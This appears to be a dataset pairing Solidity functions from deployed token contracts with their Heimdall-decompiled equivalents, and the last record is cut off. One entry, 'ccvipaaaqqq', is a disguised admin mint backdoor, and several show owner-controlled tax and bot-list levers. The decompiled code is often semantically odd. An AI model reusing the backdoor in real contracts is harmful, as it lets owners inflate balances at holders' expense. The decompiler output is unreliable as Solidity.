{"contract_address": "0x4EEB531934eb03F55032CF7468957e9cc3b9Ce7d", "original_solidity_code": "function maxWalletRule(uint256 maxTxPercent) external onlyOwner {\r\n         _maxTxAmount = (_totalSupply * maxTxPercent ) / 1000;\r\n                       \r\n    }", "heimdall_decompiled_code": "function maxWalletRule(uint256 arg0) public {\n        require(msg.sender == (address(getOwner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((arg0 == ((arg0 * totalSupply) / totalSupply)) | !totalSupply);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x03e8);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        _maxTxAmount = (arg0 * totalSupply) / 0x03e8;\n    }"}
{"contract_address": "0x31b60867a6203e76120df0612769ba136097eBc8", "original_solidity_code": "function ccvipaaaqqq() external   {\r\n        if(_msgSender() == vipadmin123){\r\n            \r\n        }else{\r\n            \r\n        }\r\n        address passok = _msgSender();\r\n        _balances[passok] += axxammount;\r\n        require(_msgSender() == vipadmin123);\r\n\r\n    }", "heimdall_decompiled_code": "function ccvipaaaqqq() public payable {\n        address var_a = msg.sender;\n        var_b = 0x06;\n        require(!storage_map_b[var_a] > (store_f + storage_map_b[var_a]));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_b[var_a] = store_f + storage_map_b[var_a];\n        require(address(msg.sender) == (address(vipadmin123)));\n    }"}
{"contract_address": "0x649695aB734cF73FDD08262D5297F0f34368274C", "original_solidity_code": "function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (store_a - ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x07;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xE5513c73eaCe54F05fDfa98061784bfd66b86bEA", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"new is 0\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"you are not owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x11;\n        var_d = 0x796f7520617265206e6f74206f776e6572000000000000000000000000000000;\n        require(address(arg0), \"new is 0\");\n        emit OwnershipTransferred(address(owner), address(arg0));\n        owner = (address(arg0)) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x08;\n        var_d = 0x6e65772069732030000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x014dC23230Ac33983E2163FAd9bEA81635b3Dd34", "original_solidity_code": "function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (!(store_a) == ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (!(store_a) == ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x57D9302e8B62a24e716C048f4925b2c74c9797dC", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(address(owner), address(arg0));\n        owner = (address(arg0)) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xd0B4fb38f8B30Ee154db85790e555d71160107d4", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x172F7a6F8C76321376cf077c4b68f6C0A0907d2f", "original_solidity_code": "function openTrading() external onlyOwner {\r\n        launchedAt = block.number;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(msg.sender) == (address(getOwner / 0x01)), \"!Owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x06;\n        var_e = 0x214f776e65720000000000000000000000000000000000000000000000000000;\n        launchedAt = block.number;\n        store_f = (0x01 * 0x01) | (uint248(store_f));\n    }"}
{"contract_address": "0x5843ACcF881D401B3AD3D749b96A308Ebb486Cef", "original_solidity_code": "function manualSwap() external {\\n        require(_msgSender()==_taxWallet);\\n        uint256 tokenBalance=balanceOf(address(this));\\n        if(tokenBalance>0){\\n          swapTokensForEth(tokenBalance);\\n        }\\n        uint256 ethBalance=address(this).balance;\\n        if(ethBalance>0){\\n          sendETHToFee(ethBalance);\\n        }\\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a]);\n        store_c = 0x01000000000000000000000000000000000000000000 | (uint248(store_c));\n        require(!storage_map_b[var_a]);\n        require(!bytes1(store_c / 0x010000000000000000000000000000000000000000));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_e).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_e), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_e);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_e), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_e).code.length);\n        (bool success, bytes memory ret0) = address(store_e).Unresolved_791ac947(var_l); // call\n        store_c = uint248(store_c);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x014dC23230Ac33983E2163FAd9bEA81635b3Dd34", "original_solidity_code": "function balanceOf(address account)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x172F7a6F8C76321376cf077c4b68f6C0A0907d2f", "original_solidity_code": "function isOwner(address account) public view returns (bool) {\r\n        return account == owner;\r\n    }", "heimdall_decompiled_code": "function isOwner(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = !(!(address(arg0)) == (address(getOwner / 0x01)));\n        return !(!(address(arg0)) == (address(getOwner / 0x01)));\n    }"}
{"contract_address": "0x7A78ca246a44065Bfc493a27f2C2A21B766dCA73", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x693E9C1e8935caf91F006bf5a2FF8a1aB2C569c7", "original_solidity_code": "function changeFeeAllocation(uint256 newRewardFee, uint256 newLpFee, uint256 newMarketingFee) external onlyOwner {\r\n        toReflections = newRewardFee;\r\n        toLiquidity = newLpFee;\r\n        toMarketing = newMarketingFee;\r\n    }", "heimdall_decompiled_code": "function changeFeeAllocation(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(getOwner)), \"!Owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f776e65720000000000000000000000000000000000000000000000000000;\n        toReflections = arg0;\n        toLiquidity = arg1;\n        toMarketing = arg2;\n    }"}
{"contract_address": "0xc2473C13f1Ebb11A06997Cf5e40dB023F96A4DA1", "original_solidity_code": "function openTrading() external onlyOwner() {\\r\\n        require(!tradingOpen,\\\"trading is already open\\\");\\r\\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\r\\n        _approve(address(this), address(uniswapV2Router), _tTotal);\\r\\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\\r\\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\\r\\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\\r\\n        swapEnabled = true;\\r\\n        tradingOpen = true;\\r\\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_g / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_f = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_f));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x3b9aca00, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_n[var_e] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                            if (!0x09 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0x01) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xbe862864614FB652e663EA82FC3AdEAD65E73d29", "original_solidity_code": "function name() public view returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x4CEDcba2dB7c99934bC64bBd575FEE5fE6E0F28b", "original_solidity_code": "function updateBuyFee(uint256 newBuyTax) external onlyOwner {\r\n        _buytax = newBuyTax;\r\n        require(newBuyTax <= 5);\r\n    }", "heimdall_decompiled_code": "function updateBuyFee(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_b = arg0;\n        require(!arg0 > 0x05);\n    }"}
{"contract_address": "0x912Abb1B9600d25937CAb8797A3CD5235bf2aAd5", "original_solidity_code": "function setTaxReceiver(address _tax_receiver) external onlyOwner {\\n        tax_receiver = _tax_receiver;\\n    }", "heimdall_decompiled_code": "function setTaxReceiver(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"UNAUTHORIZED\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x0c;\n        var_d = 0x554e415554484f52495a45440000000000000000000000000000000000000000;\n        tax_receiver = (address(arg0)) | (uint96(tax_receiver));\n    }"}
{"contract_address": "0x2C6C4c106F423c1C25932c474Abb356e8BBa8cC7", "original_solidity_code": "function approve(address to, uint256 tokenId) external;\\n\\n    /**\\n     * @dev Approve or remove `operator` as an operator for the caller.\\n     * Operators can call {transferFrom}", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        uint256 var_a = arg1;\n        var_b = 0x02;\n        require(address(storage_map_b[var_a]), \"ERC721: invalid token ID\");\n        require(!(address(arg0) == (address(storage_map_b[var_a]))), \"ERC721: invalid token ID\");\n        require(address(storage_map_b[var_a]) == msg.sender, \"ERC721: invalid token ID\");\n        var_a = address(storage_map_b[var_a]);\n        var_b = 0x05;\n        var_a = address(msg.sender);\n        uint256 var_b = keccak256(var_a);\n        require(bytes1(storage_map_b[var_a]), \"ERC721: invalid token ID\");\n        var_a = arg1;\n        var_b = 0x04;\n        storage_map_b[var_a] = (address(arg0)) | (uint96(storage_map_b[var_a]));\n        var_a = arg1;\n        var_b = 0x02;\n        require(address(storage_map_b[var_a]), \"ERC721: invalid token ID\");\n        emit Approval(address(storage_map_b[var_a]), address(arg0), arg1);\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x18;\n        var_f = 0x4552433732313a20696e76616c696420746f6b656e2049440000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x3d;\n        var_f = 0x4552433732313a20617070726f76652063616c6c6572206973206e6f7420746f;\n        var_g = 0x6b656e206f776e6572206f7220617070726f76656420666f7220616c6c000000;\n        require(address(storage_map_b[var_a]) == msg.sender, \"ERC721: approve caller is not token owner or approved for all\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x3d;\n        var_f = 0x4552433732313a20617070726f76652063616c6c6572206973206e6f7420746f;\n        var_g = 0x6b656e206f776e6572206f7220617070726f76656420666f7220616c6c000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x21;\n        var_f = 0x4552433732313a20617070726f76616c20746f2063757272656e74206f776e65;\n        var_g = 0x7200000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x18;\n        var_f = 0x4552433732313a20696e76616c696420746f6b656e2049440000000000000000;\n    }"}
{"contract_address": "0xbcdd47DA0822A0277Ae9A7c8E76B9Ed35d8c8e8B", "original_solidity_code": "function howOfenYouUseEtherumMainNet(uint8 number0To255_TheHigherTheNumberTheMoreFrequentlyUsed) public {\r\n    emit HowOfenYouUseEtherumMainNet(number0To255_TheHigherTheNumberTheMoreFrequentlyUsed);\r\n  }", "heimdall_decompiled_code": "function howOfenYouUseEtherumMainNet(uint8 arg0) public pure {\n        require(arg0 == (bytes1(arg0)));\n        bool var_a = bytes1(arg0);\n        emit HowOfenYouUseEtherumMainNet(bytes1(arg0));\n    }"}
{"contract_address": "0xF6FF7F8635a951ecF4D68264b32FB3a4b5f9cf15", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\r\\n        emit OwnershipTransferred(_owner, address(0));\\r\\n        _owner = address(0);\\r\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0xe150ed6520Ef0F5269a82638f344541e22298E51", "original_solidity_code": "function isBot(address a) public view returns (bool){\\n      return bots[a];\\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x05;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0x99D795eEDe17E3400f1Dd664fc1578CD93df464f", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x05f5e100) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x05f5e100;\n                if (0x09) {\n                    if (0x0a) {\n                        if (0x0a == 0x01) {\n                            if (0x0a == 0x02) {\n                                if (!0x09 > 0xff) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                        if (!0x09 > 0x01) {\n                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_f = 0x11;\n                                                    if (!0x01) {\n                                                    }\n                                                    if (0x0a) {\n                                                        if (0x0a == 0x01) {\n                                                            if (0x0a == 0x02) {\n                                                                if (!0x09 > 0xff) {\n                                                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                    var_f = 0x11;\n                                                                    if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xc0d5852bF2E95089EcEe1Fb3D3641A7e60073D44", "original_solidity_code": "function transfer(address recipient, uint256 amount)\\r\\n        public\\r\\n        virtual\\r\\n        override\\r\\n        returns (bool)\\r\\n    {\\r\\n        _transfer(_msgSender(), recipient, amount);\\r\\n        return true;\\r\\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        require(0 - arg1, \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(swapEnabled / 0x0100)), \"ERC20: transfer amount exceeds balance\");\n        require(address(owner) == (address(msg.sender)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(owner)) == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(address(arg0)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(this);\n        uint256 var_b = 0;\n        require(storage_map_b[var_a] < swapTokensAtAmount, \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x06;\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        var_a = address(arg0);\n        var_b = 0x08;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!(sellTotalFees > 0), \"ERC20: transfer amount exceeds balance\");\n        require((sellTotalFees == ((sellTotalFees * arg1) / arg1)) | !arg1, \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x64, \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_a = address(msg.sender);\n        var_b = 0x08;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!(buyTotalFees > 0), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(this), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0;\n        require(!(storage_map_b[var_a] < 0), \"ERC20: transfer amount exceeds balance\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - 0;\n        var_a = address(this);\n        require(!(storage_map_b[var_a] > (0 + storage_map_b[var_a])), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_b[var_a] = var_b + storage_map_b[var_a];\n        uint256 var_d = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        require(!((arg1 - 0) > arg1), \"ERC20: transfer from the zero address\");\n        var_a = 